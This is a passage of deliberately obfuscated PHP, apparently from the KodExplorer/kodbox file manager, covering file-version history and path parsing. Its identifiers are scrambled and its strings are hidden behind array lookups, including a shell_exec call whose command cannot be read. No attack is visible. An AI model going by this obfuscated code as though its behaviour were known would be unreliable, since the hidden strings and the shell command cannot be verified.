$Î øÍôŠ = array(); $î´Ä¶Ä† = array(); foreach ($§ïâáƒ as $Æ’‹·«‡) { $¹çú½İ™ = get_path_father($Æ’‹·«‡); if (!$î´Ä¶Ä†[$¹çú½İ™]) { $î´Ä¶Ä†[$¹çú½İ™] = array(); } $î´Ä¶Ä†[$¹çú½İ™][] = get_path_this($Æ’‹·«‡); } foreach ($î´Ä¶Ä† as $¹çú½İ™ => $õ¬üÒñ•) { $”·çİ§¾ = self::parsePath($¹çú½İ™); if (!$”·çİ§¾) { continue; } foreach ($õ¬üÒñ• as $ºÙä äÛ) { $ŞËÁÎŸù = self::listData(rtrim($”·çİ§¾, $œ¾†‹¾ß[8]) . $œ¾†‹¾ß[8] . $ºÙä äÛ, !1); if ($ŞËÁÎŸù && $ŞËÁÎŸù[$œ¾†‹¾ß[369]]) { $Î øÍôŠ[rtrim($¹çú½İ™, $œ¾†‹¾ß[8]) . $œ¾†‹¾ß[8] . $ºÙä äÛ] = count($ŞËÁÎŸù[$œ¾†‹¾ß[369]]); } } } return $Î øÍôŠ; } public static function add($®æØõĞ») { $ÚöéÚ =& $_SERVER[Ó¡Ÿ§‚]; $­å¬ÄŒ = self::listData($®æØõĞ»); if (!$­å¬ÄŒ) { return; } $¸’üÅ×â = Model($ÚöéÚ[769])->get($ÚöéÚ[1238]); $î„…åùŸ = $GLOBALS[$ÚöéÚ[6]][$ÚöéÚ[89]][$ÚöéÚ[1216]]; $ªç§éúä = $¸’üÅ×â == $ÚöéÚ[1239] ? min(5, $î„…åùŸ) : $î„…åùŸ; if ($î„…åùŸ <= 0) { return; } $££Õî÷Ø = IO::info($®æØõĞ»); $º¯ô…Ç  = $­å¬ÄŒ[$ÚöéÚ[369]]; if ($££Õî÷Ø[$ÚöéÚ[76]] == 0) { return; } if ($££Õî÷Ø[$ÚöéÚ[76]] >= 1024 * 1024 * 500) { return !1; } $§Óæêˆ = IO::hashSimple($®æØõĞ»); if ($º¯ô…Ç  && $º¯ô…Ç [0][$ÚöéÚ[177]] == $§Óæêˆ) { return !0; } if (array_key_exists($ÚöéÚ[203], $££Õî÷Ø) && !$££Õî÷Ø[$ÚöéÚ[203]]) { return !1; } $¡ıãÑ¬Í = short_id(time()); $ğ¤ã‘ßâ = array($ÚöéÚ[399] => $¡ıãÑ¬Í, $ÚöéÚ[177] => $§Óæêˆ, $ÚöéÚ[32] => $££Õî÷Ø[$ÚöéÚ[32]] . $ÚöéÚ[10] . date($ÚöéÚ[1240]) . rand_string(1), $ÚöéÚ[76] => $££Õî÷Ø[$ÚöéÚ[76]], $ÚöéÚ[463] => USER_ID, $ÚöéÚ[201] => time(), $ÚöéÚ[1241] => $ÚöéÚ[12]); IO::mkdir($­å¬ÄŒ[$ÚöéÚ[1242]]); $¦×ÈòÁô = IO::copy($®æØõĞ», $­å¬ÄŒ[$ÚöéÚ[1242]], !1, $ğ¤ã‘ßâ[$ÚöéÚ[32]]); if (!$¦×ÈòÁô) { self::clearEmptyFolder($­å¬ÄŒ[$ÚöéÚ[1242]]); return !1; } array_unshift($º¯ô…Ç , $ğ¤ã‘ßâ); if (count($º¯ô…Ç ) > $ªç§éúä) { $ÎÙµ÷¨¿ = array_slice($º¯ô…Ç , $ªç§éúä); foreach ($ÎÙµ÷¨¿ as $ü¶‘¦”ù) { IO::remove($­å¬ÄŒ[$ÚöéÚ[1242]] . $ü¶‘¦”ù[$ÚöéÚ[32]]); } $º¯ô…Ç  = array_slice($º¯ô…Ç , 0, $ªç§éúä); } return self::saveData($­å¬ÄŒ[$ÚöéÚ[1243]], $º¯ô…Ç ); } public static function remove($ÑØğ÷Ä, $ ¡øÁ¦) { $êˆ‘ä• =& $_SERVER[Ó¡Ÿ§‚]; $á‰úıÆğ = self::listData($ÑØğ÷Ä); $¡¿êşâŠ = array(); if (!$á‰úıÆğ) { return !1; } foreach ($á‰úıÆğ[$êˆ‘ä•[369]] as $”¥¶åú) { if ($”¥¶åú[$êˆ‘ä•[399]] == $ ¡øÁ¦) { IO::remove($á‰úıÆğ[$êˆ‘ä•[1242]] . $”¥¶åú[$êˆ‘ä•[32]]); continue; } $¡¿êşâŠ[] = $”¥¶åú; } return self::saveData($á‰úıÆğ[$êˆ‘ä•[1243]], $¡¿êşâŠ); } public static function clear($üÜÏ©ù£, $Îáú½õ = true) { $êØ£ˆü =& $_SERVER[Ó¡Ÿ§‚]; $‘Å×¾ = self::listData($üÜÏ©ù£, $Îáú½õ); if (!$‘Å×¾) { return !1; } foreach ($‘Å×¾[$êØ£ˆü[369]] as $Ÿ¥Óûˆ†) { IO::remove($‘Å×¾[$êØ£ˆü[1242]] . $Ÿ¥Óûˆ†[$êØ£ˆü[32]]); } return self::saveData($‘Å×¾[$êØ£ˆü[1243]], array()); } public static function moveHistory($Ìá±çèŠ, $›®ºêğ» = '', $ûôÒ‹× = '') { $§É¥¾¸ =& $_SERVER[Ó¡Ÿ§‚]; $ú‚±æ¨è = self::listData($Ìá±çèŠ, !1); if (!$ú‚±æ¨è || !$ú‚±æ¨è[$§É¥¾¸[369]]) { return !1; } $ÈÆ¤¸ÚØ = $§É¥¾¸[1230]; $›®ºêğ» = $›®ºêğ» ? $›®ºêğ» : get_path_this($Ìá±çèŠ); $ûôÒ‹× = $ûôÒ‹× ? $ûôÒ‹× : $ú‚±æ¨è[$§É¥¾¸[1242]]; $€ öö¸¾ = substr(get_path_this($ú‚±æ¨è[$§É¥¾¸[1243]]), 0, -strlen($ÈÆ¤¸ÚØ)); foreach ($ú‚±æ¨è[$§É¥¾¸[369]] as $„üúÆ½¹ => $ÏŞ¨) { $ˆÒÈÎøš = $›®ºêğ» . substr($ÏŞ¨[$§É¥¾¸[32]], strlen($€ öö¸¾)); $ã•·å‹ı = IO::move($ú‚±æ¨è[$§É¥¾¸[1242]] . $ÏŞ¨[$§É¥¾¸[32]], $ûôÒ‹×, !1, $ˆÒÈÎøš); if ($ã•·å‹ı) { $ú‚±æ¨è[$§É¥¾¸[369]][$„üúÆ½¹][$§É¥¾¸[32]] = $ˆÒÈÎøš; } } $ú‚±æ¨è[$§É¥¾¸[1243]] = IO::move($ú‚±æ¨è[$§É¥¾¸[1243]], $ûôÒ‹×, !1, $›®ºêğ» . $ÈÆ¤¸ÚØ); self::saveData($ú‚±æ¨è[$§É¥¾¸[1243]], $ú‚±æ¨è[$§É¥¾¸[369]]); self::clearEmptyFolder($ú‚±æ¨è[$§É¥¾¸[1242]]); } public static function rollback($Á ÊÄÙŞ, $æ¸’ö°ª) { $øÕ×çó´ =& $_SERVER[Ó¡Ÿ§‚]; $ª»±„è = self::listData($Á ÊÄÙŞ); if (!$ª»±„è) { return; } $Î€ÏŠ­Á = IO::info($Á ÊÄÙŞ); foreach ($ª»±„è[$øÕ×çó´[369]] as $êãéÄ÷ƒ => $Ù€¶ˆÊ) { if ($Ù€¶ˆÊ[$øÕ×çó´[399]] == $æ¸’ö°ª) { self::add($Á ÊÄÙŞ); $ğÑÓ›‚œ = $ª»±„è[$øÕ×çó´[1242]] . $Ù€¶ˆÊ[$øÕ×çó´[32]]; $õèİÀ = IO::copy($ğÑÓ›‚œ, IO::pathFather($Á ÊÄÙŞ), REPEAT_REPLACE, $Î€ÏŠ­Á[$øÕ×çó´[32]]); if ($õèİÀ) { self::remove($Á ÊÄÙŞ, $æ¸’ö°ª); } return $õèİÀ; } } return !1; } public static function setDetail($Å¼íõ†¤, $Äú¶Ñ”, $ãğØ¨ñö) { $¸’œáØ¸ =& $_SERVER[Ó¡Ÿ§‚]; $‹Óß—ŒÊ = self::listData($Å¼íõ†¤); if (!$‹Óß—ŒÊ) { return; } foreach ($‹Óß—ŒÊ[$¸’œáØ¸[369]] as $ÍÃÉì“² => $³¢ŠÙÈ) { if ($³¢ŠÙÈ[$¸’œáØ¸[399]] == $Äú¶Ñ”) { $‹Óß—ŒÊ[$¸’œáØ¸[369]][$ÍÃÉì“²][$¸’œáØ¸[1241]] = $ãğØ¨ñö; self::saveData($‹Óß—ŒÊ[$¸’œáØ¸[1243]], $‹Óß—ŒÊ[$¸’œáØ¸[369]]); return !0; } } return !1; } public static function fileInfo($á›¨‡Ë‡, $¸³·ç¢) { $ó“¾®ñ =& $_SERVER[Ó¡Ÿ§‚]; $°ñ×Õ…» = self::listData($á›¨‡Ë‡); if (!$°ñ×Õ…») { show_json(LNG($ó“¾®ñ[105]), !1); } $†ÊÛ€õ = $ó“¾®ñ[12]; foreach ($°ñ×Õ…»[$ó“¾®ñ[369]] as $¾åŒŸĞ => $Ğúäƒï¢) { if ($Ğúäƒï¢[$ó“¾®ñ[399]] != $¸³·ç¢) { continue; } $†ÊÛ€õ = $°ñ×Õ…»[$ó“¾®ñ[1242]] . $Ğúäƒï¢[$ó“¾®ñ[32]]; break; } if (!$†ÊÛ€õ) { show_json(LNG($ó“¾®ñ[105]), !1); } return IO::info($†ÊÛ€õ); } public static function fileOut($˜©Ø¾¢, $Å–ƒ…¿µ, $½Áö´¶ = false) { $‘ªæ»‹– =& $_SERVER[Ó¡Ÿ§‚]; $ÃïìÉâ = self::fileInfo($˜©Ø¾¢, $Å–ƒ…¿µ); $«±•èÄ“ =& $GLOBALS[$‘ªæ»‹–[7]]; $½Áö´¶ = isset($«±•èÄ“[$‘ªæ»‹–[1193]]) && $«±•èÄ“[$‘ªæ»‹–[1193]] == 1; if (isset($«±•èÄ“[$‘ªæ»‹–[33]]) && $«±•èÄ“[$‘ªæ»‹–[33]] == $‘ªæ»‹–[1244]) { return IO::fileOutImage($ÃïìÉâ[$‘ªæ»‹–[84]], $«±•èÄ“[$‘ªæ»‹–[1245]]); } IO::fileOut($ÃïìÉâ[$‘ªæ»‹–[84]], $½Áö´¶, get_path_this($˜©Ø¾¢)); } public static function listData($ïÌ©§‘’, $¦¦Êèš† = true) { $Õ“Û´¢¾ =& $_SERVER[Ó¡Ÿ§‚]; if ($¦¦Êèš† && !IO::exist($ïÌ©§‘’)) { return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } if (substr($ïÌ©§‘’, 0, strlen(TEMP_PATH)) == TEMP_PATH) { return !1; } $¦âéÜ¢ = self::pathHistory($ïÌ©§‘’); $‚±•àûÁ = array($Õ“Û´¢¾[1243] => $¦âéÜ¢ . $Õ“Û´¢¾[1230], $Õ“Û´¢¾[1242] => rtrim(get_path_father($¦âéÜ¢), $Õ“Û´¢¾[8]) . $Õ“Û´¢¾[8], $Õ“Û´¢¾[369] => array()); $§¼ó’ëß = IO::getContent($‚±•àûÁ[$Õ“Û´¢¾[1243]]); if ($§¼ó’ëß) { $¦ŸÃôë = json_decode($§¼ó’ëß, !0); if (is_array($¦ŸÃôë)) { $‚±•àûÁ[$Õ“Û´¢¾[369]] = $¦ŸÃôë; } } return $‚±•àûÁ; } private static function saveData($’üÙ½–, $×òŠŞÙÀ) { $ûÈëëÕ =& $_SERVER[Ó¡Ÿ§‚]; self::log($ûÈëëÕ[1246] . $’üÙ½– . $ûÈëëÕ[71] . count($×òŠŞÙÀ), $ûÈëëÕ[750]); if ($×òŠŞÙÀ) { return IO::setContent($’üÙ½–, json_encode($×òŠŞÙÀ)); } $ÊÇàø¸ = IO::pathFather($’üÙ½–); IO::remove($’üÙ½–); self::clearEmptyFolder($ÊÇàø¸); return !0; } public static function clearEmptyFolder($‹õ÷‚‚Ä) { $¨«Áº” =& $_SERVER[Ó¡Ÿ§‚]; if (trim($‹õ÷‚‚Ä, $¨«Áº”[8]) == trim(self::$_historyBase, $¨«Áº”[8])) { return; } $ÇÙÏßÜ£ = IO::pathFather($‹õ÷‚‚Ä); $‘íóß = IO::has($‹õ÷‚‚Ä, !0); if ($‘íóß[$¨«Áº”[207]] > 0 || $‘íóß[$¨«Áº”[208]] > 0) { return; } IO::remove($‹õ÷‚‚Ä); self::clearEmptyFolder($ÇÙÏßÜ£); } private static function getBasePath() { $ÏÍòá“ü =& $_SERVER[Ó¡Ÿ§‚]; $éãÃ¸ª = Model($ÏÍòá“ü[1247])->get($ÏÍòá“ü[1248]); if ($éãÃ¸ª) { if (!IO::exist($éãÃ¸ª)) { IO::mkdir($éãÃ¸ª); } if (get_path_this($éãÃ¸ª) == $ÏÍòá“ü[1233]) { $ÑÙ¬ªÚ« = $ÏÍòá“ü[1249] . rand_string(8); @rename($éãÃ¸ª, get_path_father($éãÃ¸ª) . $ÏÍòá“ü[8] . $ÑÙ¬ªÚ«); $éãÃ¸ª = DATA_PATH . $ÑÙ¬ªÚ« . $ÏÍòá“ü[8]; file_put_contents(DATA_PATH . $ÏÍòá“ü[1183], $ÏÍòá“ü[12]); Model($ÏÍòá“ü[1247])->set($ÏÍòá“ü[1248], $éãÃ¸ª); } return $éãÃ¸ª; } $éãÃ¸ª = DATA_PATH . $ÏÍòá“ü[1249] . rand_string(8) . $ÏÍòá“ü[8]; $éãÃ¸ª = IO::mkdir($éãÃ¸ª); $éãÃ¸ª = rtrim($éãÃ¸ª, $ÏÍòá“ü[8]) . $ÏÍòá“ü[8]; file_put_contents($éãÃ¸ª . $ÏÍòá“ü[1183], $ÏÍòá“ü[12]); file_put_contents(DATA_PATH . $ÏÍòá“ü[1183], $ÏÍòá“ü[12]); Model($ÏÍòá“ü[1247])->set($ÏÍòá“ü[1248], $éãÃ¸ª); return $éãÃ¸ª; } } class KodIO { const KOD_SOURCE = "\x7b\x73\x6f\165\162\x63\145\175"; const KOD_USER_RECYCLE = "\173\165\x73\145\162\122\145\143\171\x63\x6c\145\175"; const KOD_USER_FAV = "\x7b\x75\163\x65\162\106\141\166\x7d"; const KOD_USER_FILE_TAG = "\173\165\163\145\162\x46\151\154\x65\x54\x61\x67\x7d"; const KOD_USER_FILE_TYPE = "\173\165\163\145\x72\x46\x69\154\x65\124\171\x70\x65\x7d"; const KOD_GROUP_ROOT_SELF = "\173\x67\x72\157\x75\160\x52\x6f\157\x74\123\x65\x6c\146\x7d"; const KOD_USER_SHARE = "\173\x75\163\x65\162\123\150\141\x72\145\175"; const KOD_USER_SHARE_LINK = "\x7b\165\163\x65\x72\123\x68\x61\x72\x65\x4c\x69\156\x6b\175"; const KOD_USER_SHARE_TO_ME = "\x7b\x73\150\x61\162\145\x54\157\x4d\145\x7d"; const KOD_SHARE_ITEM = "\x7b\163\150\141\x72\145\x49\x74\145\x6d\175"; const KOD_SHARE_LINK = "\173\163\150\141\x72\145\x49\164\x65\x6d\x4c\x69\x6e\x6b\175"; const KOD_SEARCH = "\173\x73\x65\x61\162\143\150\x7d"; const KOD_BLOCK = "\x7b\x62\154\157\x63\x6b\175"; const KOD_IO = "\173\151\x6f\x7d"; const KOD_USER_RECENT = "\173\x75\x73\145\162\x52\145\156\143\145\x6e\x74\175"; const KOD_USER_DRIVER = "\x7b\144\162\x69\166\145\162\175"; public static function typeList() { $¶ÇŞÅ‚ =& $_SERVER[Ó¡Ÿ§‚]; return array($¶ÇŞÅ‚[1250] => self::KOD_SOURCE, $¶ÇŞÅ‚[1251] => self::KOD_USER_RECYCLE, $¶ÇŞÅ‚[1252] => self::KOD_USER_FAV, $¶ÇŞÅ‚[1253] => self::KOD_USER_FILE_TAG, $¶ÇŞÅ‚[1254] => self::KOD_USER_FILE_TYPE, $¶ÇŞÅ‚[1255] => self::KOD_GROUP_ROOT_SELF, $¶ÇŞÅ‚[1256] => self::KOD_USER_SHARE, $¶ÇŞÅ‚[1257] => self::KOD_USER_SHARE_LINK, $¶ÇŞÅ‚[1258] => self::KOD_USER_SHARE_TO_ME, $¶ÇŞÅ‚[1259] => self::KOD_SHARE_ITEM, $¶ÇŞÅ‚[1260] => self::KOD_SHARE_LINK, $¶ÇŞÅ‚[1261] => self::KOD_SEARCH, $¶ÇŞÅ‚[1262] => self::KOD_BLOCK, $¶ÇŞÅ‚[1263] => self::KOD_IO, $¶ÇŞÅ‚[1264] => self::KOD_USER_RECENT, $¶ÇŞÅ‚[1265] => self::KOD_USER_DRIVER); } public static function parse($Ú¥¦ÄÌ») { $‘ØÊù§ =& $_SERVER[Ó¡Ÿ§‚]; $Ú¥¦ÄÌ» = self::clear($Ú¥¦ÄÌ»); $ùúœ§¡¥ = array_values(self::typeList()); preg_match($‘ØÊù§[1266], $Ú¥¦ÄÌ», $›óé Ğ¾); $õÏ°Íœ± = array($‘ØÊù§[431] => !1, $‘ØÊù§[1267] => !1, $‘ØÊù§[428] => !1, $‘ØÊù§[84] => $Ú¥¦ÄÌ», $‘ØÊù§[1168] => !1, $‘ØÊù§[1167] => $‘ØÊù§[12]); if (is_array($›óé Ğ¾) && count($›óé Ğ¾) == 5) { $ÙôÇóÜö = $‘ØÊù§[1268] . $›óé Ğ¾[2] . $‘ØÊù§[327]; if (in_array($ÙôÇóÜö, $ùúœ§¡¥)) { $õÏ°Íœ±[$‘ØÊù§[1168]] = $›óé Ğ¾[1]; $õÏ°Íœ±[$‘ØÊù§[33]] = $ÙôÇóÜö; $õÏ°Íœ±[$‘ØÊù§[1269]] = substr($ÙôÇóÜö, 1, -1); $õÏ°Íœ±[$‘ØÊù§[399]] = $›óé Ğ¾[3]; } $õÏ°Íœ±[$‘ØÊù§[1167]] = $›óé Ğ¾[4]; } $·÷è•òë = array($‘ØÊù§[12], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $õÏ°Íœ±[$‘ØÊù§[1232]] = in_array($õÏ°Íœ±[$‘ØÊù§[33]], $·÷è•òë); return $õÏ°Íœ±; } public static function isTruePath($ù˜ŸÄÜÍ) { $°åÍ¡Óä =& $_SERVER[Ó¡Ÿ§‚]; if (substr($ù˜ŸÄÜÍ, 0, 1) != $°åÍ¡Óä[1268]) { return !0; } if (strpos($ù˜ŸÄÜÍ, $°åÍ¡Óä[417]) === 0) { return !0; } if (strpos($ù˜ŸÄÜÍ, $°åÍ¡Óä[1236]) === 0) { return !0; } if (strpos($ù˜ŸÄÜÍ, $°åÍ¡Óä[1270]) === 0) { return !0; } if (strpos($ù˜ŸÄÜÍ, $°åÍ¡Óä[1271]) === 0) { return !0; } if (strpos($ù˜ŸÄÜÍ, $°åÍ¡Óä[1272]) === 0) { return !0; } return !1; } public static function clear($¬ß±ô£ê) { $ğÛéŒßÔ =& $_SERVER[Ó¡Ÿ§‚]; $¬ß±ô£ê = str_replace(array($ğÛéŒßÔ[1077], $ğÛéŒßÔ[231]), $ğÛéŒßÔ[53], $¬ß±ô£ê); $¬ß±ô£ê = str_replace($ğÛéŒßÔ[97], $ğÛéŒßÔ[8], $¬ß±ô£ê); $¬üƒñş = $ğÛéŒßÔ[1273]; if (substr($¬ß±ô£ê, 0, 3) == $ğÛéŒßÔ[1274]) { $¬ß±ô£ê = substr($¬ß±ô£ê, 3); } while (strstr($¬ß±ô£ê, $¬üƒñş)) { $¬ß±ô£ê = str_replace($¬üƒñş, $ğÛéŒßÔ[8], $¬ß±ô£ê); } $¬ß±ô£ê = preg_replace($ğÛéŒßÔ[1275], $ğÛéŒßÔ[8], $¬ß±ô£ê); if ($¬ß±ô£ê == $ğÛéŒßÔ[8]) { return $ğÛéŒßÔ[8]; } $¬ß±ô£ê = rtrim($¬ß±ô£ê, $ğÛéŒßÔ[8]); return $¬ß±ô£ê; } public static function sourceID($ù¡¢ÅÅ¤) { $¿Ó´‹—İ =& $_SERVER[Ó¡Ÿ§‚]; $ƒ¹´›£“ = self::parse($ù¡¢ÅÅ¤); if ($ƒ¹´›£“[$¿Ó´‹—İ[33]] !== self::KOD_SOURCE) { show_json(LNG($¿Ó´‹—İ[1276]), !1); } return $ƒ¹´›£“[$¿Ó´‹—İ[399]]; } public static function make($ñä´·½) { if (!$ñä´·½) { return !1; } return self::makePath(self::KOD_SOURCE, intval($ñä´·½)); } public static function makeShare($ãÂ˜Š°„, $ôœÄíŸô) { return self::makePath(self::KOD_SHARE_ITEM, $ãÂ˜Š°„, $ôœÄíŸô); } public static function makeFileTypePath($Ó’®‡Ê–) { return self::makePath(self::KOD_USER_FILE_TYPE, $Ó’®‡Ê–); } public static function makeFileTagPath($–¨×Ì‡Ñ) { return self::makePath(self::KOD_USER_FILE_TAG, $–¨×Ì‡Ñ); } public static function makePath($ÀÖ£«ìû, $¼µ“îÌÈ = '', $úæôÆ‡ = '') { $½ÇĞòœ‡ =& $_SERVER[Ó¡Ÿ§‚]; $Ãßèß•º = substr($ÀÖ£«ìû, 1, -1); $¹©„Î÷à = $½ÇĞòœ‡[1277] . $Ãßèß•º . $½ÇĞòœ‡[1278] . $¼µ“îÌÈ . $½ÇĞòœ‡[1279]; $¹©„Î÷à = $úæôÆ‡ ? $¹©„Î÷à . $úæôÆ‡ . $½ÇĞòœ‡[8] : $¹©„Î÷à; return $¹©„Î÷à; } public static function hashPath($œš‰­ó, $àÉ™ú÷Ó = true) { $‹µƒŠ«¹ =& $_SERVER[Ó¡Ÿ§‚]; $ÑÈ™Ë¼¹ = is_array($œš‰­ó) ? $œš‰­ó : IO::info($œš‰­ó); $’“›åª = _get($ÑÈ™Ë¼¹, $‹µƒŠ«¹[1280], $‹µƒŠ«¹[12]); if (!$’“›åª && isset($ÑÈ™Ë¼¹[$‹µƒŠ«¹[411]])) { $ÑÈ™Ë¼¹ = IO::info(KodIO::make($ÑÈ™Ë¼¹[$‹µƒŠ«¹[411]])); $’“›åª = _get($ÑÈ™Ë¼¹, $‹µƒŠ«¹[1280], $‹µƒŠ«¹[12]); } if (!$’“›åª && $àÉ™ú÷Ó) { $»Ğ«Ìê = KodIO::parse($ÑÈ™Ë¼¹[$‹µƒŠ«¹[84]]); if (!$»Ğ«Ìê[$‹µƒŠ«¹[33]]) { $’“›åª = IO::hashSimple($ÑÈ™Ë¼¹[$‹µƒŠ«¹[84]]); } } if (!$’“›åª) { $’“›åª = md5($ÑÈ™Ë¼¹[$‹µƒŠ«¹[84]] . $ÑÈ™Ë¼¹[$‹µƒŠ«¹[76]] . $ÑÈ™Ë¼¹[$‹µƒŠ«¹[85]]); } return $’“›åª; } public static function hashPathSafe($ÁÒ¨¹¤â, $ÛñËôİî = true) { $ÃØÃÁˆ =& $_SERVER[Ó¡Ÿ§‚]; $ì‡‘Øî = self::hashPath($ÁÒ¨¹¤â, $ÛñËôİî); return md5($ì‡‘Øî . $ÃØÃÁˆ[1281] . Model($ÃØÃÁˆ[769])->get($ÃØÃÁˆ[770])); } public static function initSystemPath() { $ÑÜÃĞÓ =& $_SERVER[Ó¡Ÿ§‚]; if (defined($ÑÜÃĞÓ[1282])) { return; } define($ÑÜÃĞÓ[1282], self::systemPath($ÑÜÃĞÓ[1283])); define($ÑÜÃĞÓ[1284], self::systemPath($ÑÜÃĞÓ[1285])); define($ÑÜÃĞÓ[1286], self::systemPath($ÑÜÃĞÓ[1287])); define($ÑÜÃĞÓ[1288], self::systemPath($ÑÜÃĞÓ[1289])); IOHistory::bindEvent(); } public static function systemPath($¯å•Ìé) { $üë÷çâ½ =& $_SERVER[Ó¡Ÿ§‚]; $Ç£ÊáÌò = $üë÷çâ½[1290] . ucfirst($¯å•Ìé); $Œ–ªè®¬ = Model($üë÷çâ½[769])->get($Ç£ÊáÌò); if ($Œ–ªè®¬) { return $Œ–ªè®¬; } if ($¯å•Ìé == $üë÷çâ½[1283]) { $Œ–ªè®¬ = self::make(Model($üë÷çâ½[824])->systemRootPathAdd($üë÷çâ½[543])); } else { $Œ–ªè®¬ = self::systemPath($üë÷çâ½[1283]); $’÷ª§Œİ = self::sourceID($Œ–ªè®¬); $Œ–ªè®¬ = self::make(Model($üë÷çâ½[824])->mkdir($’÷ª§Œİ, $¯å•Ìé)); } Model($üë÷çâ½[769])->set($Ç£ÊáÌò, $Œ–ªè®¬); return $Œ–ªè®¬; } public static function systemFolder($Ÿ»ì¯ËÂ) { $è­±ğ£ = IO_PATH_SYSTEM_SOURCE . $Ÿ»ì¯ËÂ; $şß¥Ñ÷ = Cache::get($è­±ğ£); if (!$şß¥Ñ÷) { $Áş•üü = IO::infoFull($è­±ğ£); if (!$Áş•üü) { $şß¥Ñ÷ = IO::mkdir($è­±ğ£, REPEAT_SKIP); } else { $şß¥Ñ÷ = $Áş•üü[$_SERVER[Ó¡Ÿ§‚][84]]; } Cache::set($è­±ğ£, $şß¥Ñ÷, 3600 * 10); } return $şß¥Ñ÷; } public static function defaultDriver() { return Model($_SERVER[Ó¡Ÿ§‚][766])->defaultDriver(); } public static function defaultIO() { $£ «¤ô’ =& $_SERVER[Ó¡Ÿ§‚]; $ı´á»²Ã = self::defaultDriver(); return $£ «¤ô’[1291] . $ı´á»²Ã[$£ «¤ô’[399]] . $£ «¤ô’[1279]; } public static function defaultDriverInit() { static $‘ê„üº = false; if ($‘ê„üº) { return $‘ê„üº; } $‘ê„üº = IO::init(self::defaultIO()); return $‘ê„üº; } public static function fileTypeList() { $ÑÃ‘‘ =& $_SERVER[Ó¡Ÿ§‚]; $…¼ñô¶Õ = $GLOBALS[$ÑÃ‘‘[6]][$ÑÃ‘‘[1292]]; foreach ($…¼ñô¶Õ as $—×¨Áâæ => $›Ó›¾½è) { $»½öÖØ = $ÑÃ‘‘[1293] . $—×¨Áâæ; $ê¢ÂÔ» = LNG($»½öÖØ); if ($»½öÖØ != $ê¢ÂÔ») { $…¼ñô¶Õ[$—×¨Áâæ][$ÑÃ‘‘[32]] = $ê¢ÂÔ»; } } return $…¼ñô¶Õ; } public static function diskList($¦£ÈÏØæ = true) { $àß¡è§„ = $_SERVER[Ó¡Ÿ§‚][1294]; if ($¦£ÈÏØæ) { $ìı˜ğË = Cache::get($àß¡è§„); if (is_array($ìı˜ğË)) { return $ìı˜ğË; } } $ìı˜ğË = self::diskListGet(); Cache::set($àß¡è§„, $ìı˜ğË, 60); return $ìı˜ğË; } public static function diskListGet() { $ß“•¨Æİ =& $_SERVER[Ó¡Ÿ§‚]; $’§Ğ½íí = array(); if ($GLOBALS[$ß“•¨Æİ[6]][$ß“•¨Æİ[1295]] == $ß“•¨Æİ[1296]) { $•ƒ¥¡ = $ß“•¨Æİ[1297]; for ($Îªé¥Ù = 0; $Îªé¥Ù < strlen($•ƒ¥¡); $Îªé¥Ù++) { $±â™­¹ = $•ƒ¥¡[$Îªé¥Ù] . $ß“•¨Æİ[1298]; if (file_exists($±â™­¹)) { $’§Ğ½íí[] = $±â™­¹; } } return $’§Ğ½íí; } if (!function_exists($ß“•¨Æİ[98])) { $’§Ğ½íí[] = $ß“•¨Æİ[834]; return $’§Ğ½íí; } $¥Æùğ = explode($ß“•¨Æİ[231], shell_exec($ß“•¨Æİ[1299])); array_shift($¥Æùğ); array_pop($¥Æùğ); $õÆ¿œê£ = array($ß“•¨Æİ[1300], $ß“•¨Æİ[1301], $ß“•¨Æİ[1302], $ß“•¨Æİ[1303], $ß“•¨Æİ[1304], $ß“•¨Æİ[1305], $ß“•¨Æİ[1306], $ß“•¨Æİ[1307]); foreach ($¥Æùğ as $èä‰ÚÜê) { $’÷†ÓÒı = preg_split($ß“•¨Æİ[1308], $èä‰ÚÜê); $±â™­¹ = $’÷†ÓÒı[count($’÷†ÓÒı) - 1]; if (!strstr($’÷†ÓÒı[0], $ß“•¨Æİ[1309]) || !$±â™­¹) { continue; } $Ïˆ¦àé‘ = rtrim($±â™­¹, $ß“•¨Æİ[8]) . $ß“•¨Æİ[8]; if (in_array($Ïˆ¦àé‘, $õÆ¿œê£)) { continue; } $’§Ğ½íí[] = $Ïˆ¦àé‘; } return $’§Ğ½íí; } public static function isSameDisk($—ìøÚ¯«, $µïã×ø) { $»õ·¿»Š =& $_SERVER[Ó¡Ÿ§‚]; if ($GLOBALS[$»õ·¿»Š[6]][$»õ·¿»Š[1295]] == $»õ·¿»Š[1296]) { return strtolower(substr($—ìøÚ¯«, 0, 1)) == strtolower(substr($µïã×ø, 0, 1)); } $Ê½Ç“ó¯ = self::diskList(); $ğŞÀÑ®ª = !1; $¯Éá©£Ÿ = !1; sort($Ê½Ç“ó¯); $Ê½Ç“ó¯ = array_reverse($Ê½Ç“ó¯); $—ìøÚ¯« = rtrim($—ìøÚ¯«, $»õ·¿»Š[8]) . $»õ·¿»Š[8]; $µïã×ø = rtrim($µïã×ø, $»õ·¿»Š[8]) . $»õ·¿»Š[8]; foreach ($Ê½Ç“ó¯ as $ÁÑêãÃ›) { $®ß›î®À = strlen($ÁÑêãÃ›); if (!$ğŞÀÑ®ª && substr($—ìøÚ¯«, 0, $®ß›î®À) == $ÁÑêãÃ›) { $ğŞÀÑ®ª = $ÁÑêãÃ›; } if (!$¯Éá©£Ÿ && substr($µïã×ø, 0, $®ß›î®À) == $ÁÑêãÃ›) { $¯Éá©£Ÿ = $ÁÑêãÃ›; } if ($ğŞÀÑ®ª && $¯Éá©£Ÿ) { break; } } return $ğŞÀÑ®ª === $¯Éá©£Ÿ; } public static function transferType($Ï¹È‰¼·, $ßË¼Å¶Õ) { $ÉÀÚ€ú™ =& $_SERVER[Ó¡Ÿ§‚]; $²¿ßËØå = self::driverType($Ï¹È‰¼·); $İâŒùÅñ = self::driverType($ßË¼Å¶Õ); if ($²¿ßËØå[$ÉÀÚ€ú™[33]] == $İâŒùÅñ[$ÉÀÚ€ú™[33]] && $²¿ßËØå[$ÉÀÚ€ú™[1310]] == $İâŒùÅñ[$ÉÀÚ€ú™[1310]]) { return $ÉÀÚ€ú™[1311]; } if ($²¿ßËØå[$ÉÀÚ€ú™[33]] == $ÉÀÚ€ú™[867] && $İâŒùÅñ[$ÉÀÚ€ú™[33]] == $ÉÀÚ€ú™[106]) { return $ÉÀÚ€ú™[1193]; } if ($²¿ßËØå[$ÉÀÚ€ú™[33]] == $ÉÀÚ€ú™[106] && $İâŒùÅñ[$ÉÀÚ€ú™[33]] == $ÉÀÚ€ú™[867]) { return 